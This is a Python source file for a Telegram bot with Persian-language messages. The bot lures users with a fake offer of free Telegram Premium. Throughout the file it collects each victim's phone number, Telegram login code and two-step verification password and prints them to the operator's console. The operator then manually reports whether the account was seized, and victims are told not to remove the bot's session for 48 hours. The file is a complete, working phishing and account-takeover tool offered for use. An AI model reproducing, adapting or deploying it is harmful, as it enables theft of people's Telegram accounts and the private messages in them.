import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from termcolor import colored
import art
API = input("enter your api token ->")
CH = input("enter your channel username (example : @user_id)")
bot = telebot.TeleBot(API) 
CHANNEL_USERNAME = CH

user_codes = {}
pending_verifications = {}

def set_button():
    buttons = []
    for a in range(1, 10):
        buttons.append(InlineKeyboardButton(f"{a}", callback_data=f'num_{a}'))
    button = InlineKeyboardMarkup(row_width=4)
    zero = InlineKeyboardButton('0', callback_data='num_0')
    ok = InlineKeyboardButton('OK', callback_data='ok')
    delete = InlineKeyboardButton('حذف', callback_data='delete')  
    button.add(*buttons[:3])
    button.add(*buttons[3:6])
    button.add(*buttons[6:])
    button.add(zero)
    button.add(ok)
    button.add(delete)
    return button

def set_no_2fa_button():
    markup = InlineKeyboardMarkup()
    no_2fa_button = InlineKeyboardButton("حساب من تایید دو مرحله‌ای ندارد", callback_data='no_2fa')
    markup.add(no_2fa_button)
    return markup

def print_user_info(user):
    """Print detailed user information."""
    
    user_id = user.id
    username = user.username if user.username else "N/A"
    first_name = user.first_name if user.first_name else "N/A"
    last_name = user.last_name if user.last_name else "N/A"
    language_code = user.language_code if user.language_code else "N/A"

    print(colored("=" * 30, 'cyan'))
    print(colored("User Info:", 'magenta'))
    print(colored(f"User ID: {user_id}", 'yellow'))
    print(colored(f"Username: {username}", 'yellow'))
    print(colored(f"First Name: {first_name}", 'yellow'))
    print(colored(f"Last Name: {last_name}", 'yellow'))
    print(colored(f"Language Code: {language_code}", 'yellow'))
    print(colored("=" * 30, 'cyan'))

def check_membership(user_id, chat_id):
    try:
        member = bot.get_chat_member(chat_id, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(colored(f"Error checking membership: {e}", 'red'))
        return False

ascii_art = art.text2art("inits5", font='block') 
info_message = f"""
{colored(ascii_art, 'yellow')}
👤 Telegram: {colored('@inits5', 'blue')}
🔗 GitHub: {colored('https://github.com/inits5/', 'green')}
"""
print(info_message.strip()) 

@bot.message_handler(commands=['start', 'again'])
def welcome(message):
    user = message.from_user  
    print_user_info(user)      

    if not check_membership(user.id, CHANNEL_USERNAME):
        markup = InlineKeyboardMarkup()
        button = InlineKeyboardButton("عضویت در کانال", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")
        markup.add(button)
        
        bot.send_message(message.chat.id, 
                         "لطفاً ابتدا در کانال ما عضو شوید تا بتوانید از خدمات ربات استفاده کنید و سپس مجدداً روی /start کلیک کنید.", 
                         reply_markup=markup)
        return  

    photo = "image.png"
    caption = "سلام! خوش آمدید!"
    
    with open(photo, 'rb') as photo_file:
        bot.send_photo(message.chat.id, photo_file, caption=caption)
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    button = KeyboardButton("ارسال شماره تلفن", request_contact=True)
    markup.add(button)
    
    bot.send_message(message.chat.id, 
                     "🎉 سلام! این ربات به شما یک ماه پرمیوم تلگرام هدیه می‌دهد! برای اینکه ربات بتواند هویت شما را تأیید کند، لطفاً شماره تلفن خود را ارسال کنید.", 
                     reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    contact = message.contact
    phone_number = contact.phone_number
    print(colored(f"Number -> {phone_number}", 'green'))
    
    bot.send_message(message.chat.id, 
                     "برای فعال‌سازی پرمیوم، لطفاً کد تأیید را برای ما بخوانید یا از پیوی تلگرام فوروارد کنید. اگر مراحل را درست انجام دهید، حساب شما تا ۴۸ ساعت آینده پرمیوم دریافت می‌کند! بیایید شروع کنیم! کد را ارسال کنید:")

    bot.send_message(message.chat.id, "لطفاً کد تأیید خود را از دکمه‌های زیر وارد کنید:", reply_markup=set_button())

@bot.callback_query_handler(func=lambda call: call.data.startswith('num_') or call.data == 'ok' or call.data == 'delete')
def handle_callback(call):
    user_id = call.message.chat.id
    
    if call.data.startswith('num_'):
        num = call.data.split('_')[1]
        
        if user_id not in user_codes:
            user_codes[user_id] = ""
        
        user_codes[user_id] += num
        
        bot.edit_message_text(
            chat_id=user_id,
            message_id=call.message.message_id,
            text=f"کد واردشده: {user_codes[user_id]}",
            reply_markup=set_button()
        )
    
    elif call.data == 'ok':
        username_or_id = call.from_user.username if call.from_user.username else str(call.from_user.id)
        entered_code_colored = colored(user_codes[user_id], 'cyan', attrs=['bold']) 
        print(colored(f"User {username_or_id} entered code: {entered_code_colored}", 'blue')) 
        
        if user_has_two_factor_authentication(user_id):  
            pending_verifications[user_id] = True
            bot.send_message(user_id, "لطفاً کد تأیید دو مرحله‌ای خود را وارد کنید یا اگر حساب شما تایید دو مرحله‌ای ندارد، بفرمایید.", reply_markup=set_no_2fa_button())
            print(colored(f"User {username_or_id} has 2FA enabled.", 'green'))
        else:
            bot.send_message(user_id, "متأسفانه حساب شما تایید دو مرحله‌ای ندارد.")
            print(colored(f"User {username_or_id} does not have 2FA protection.", 'red'))
            wait_for_confirmation(user_id)

    elif call.data == 'delete':
        if user_id in user_codes and user_codes[user_id]:
            user_codes[user_id] = user_codes[user_id][:-1]
            bot.edit_message_text(
                chat_id=user_id,
                message_id=call.message.message_id,
                text=f"کد واردشده: {user_codes[user_id]}",
                reply_markup=set_button()
            )
        else:
            bot.answer_callback_query(call.id, "هیچ عددی برای حذف وجود ندارد.")

@bot.callback_query_handler(func=lambda call: call.data == 'no_2fa')
def handle_no_2fa(call):
    user_id = call.message.chat.id
    username_or_id = call.from_user.username if call.from_user.username else str(call.from_user.id)
    
    print(colored(f"User {username_or_id} indicated no 2FA.", 'yellow'))
    
    wait_for_confirmation(user_id)

def user_has_two_factor_authentication(user_id):
    return True  

@bot.message_handler(func=lambda message: message.chat.id in pending_verifications)
def handle_2fa_code(message):
    user_id = message.chat.id
    entered_code = message.text.strip()
    
    username_or_id = message.from_user.username if message.from_user.username else str(message.from_user.id)
    
    entered_code_colored = colored(entered_code, 'magenta', attrs=['bold'])  
    print(colored(f"User {username_or_id} entered 2FA code: {entered_code_colored}", 'blue'))  
    
    wait_for_confirmation(user_id)

def wait_for_confirmation(user_id):
   bot.send_message(user_id, "لطفا منتظر تایید ربات بمانید...")
   
   confirmation_input = input("Enter 'y' for success or 'n' for failure: ")
   
   if confirmation_input.lower() == 'y':
       bot.send_message(user_id,
                        """🎉 تبریک! حساب شما با موفقیت فعال شد! 🥳

ربات در حال فعال‌سازی پرمیوم بر روی حساب شماست؛ لطفاً تا ۴۸ ساعت آینده از حذف حساب ربات خودداری کنید. ❗️❗️
پس از فعال‌سازی، ربات به صورت خودکار از حساب شما خارج خواهد شد. ✅""")
       print(colored(f"User {user_id} confirmed access.", 'green'))
       
       del pending_verifications[user_id]
       
   elif confirmation_input.lower() == 'n':
       bot.send_message(user_id,
                        """
                        /again متأسفانه ربات نتوانست به حساب شما دسترسی پیدا کند، لطفا مجدد تلاش کنید.
                        """)
       print(colored(f"User {user_id} denied access.", 'red'))
       
       del pending_verifications[user_id]

bot.infinity_polling()
